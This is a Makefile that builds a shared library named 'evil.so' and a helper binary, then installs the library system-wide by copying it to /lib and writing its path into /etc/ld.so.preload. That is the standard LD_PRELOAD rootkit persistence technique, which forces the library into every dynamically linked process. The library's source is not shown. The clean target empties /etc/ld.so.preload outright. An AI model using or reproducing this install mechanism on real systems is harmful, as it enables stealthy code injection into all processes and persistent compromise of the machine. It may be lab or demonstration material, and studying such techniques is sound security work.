CC=gcc

all: evil any
evil: evil.c
	$(CC) -o evil.so evil.c -ldl -fPIC -shared -D_GNU_SOURCE

any: any.c
	$(CC) -o any any.c

install: evil.so
	cp evil.so /lib/evil.so
	echo "/lib/evil.so" > /etc/ld.so.preload

clean:
	truncate -s 0 /etc/ld.so.preload
	rm evil.so
	rm any
	rm /lib/evil.so
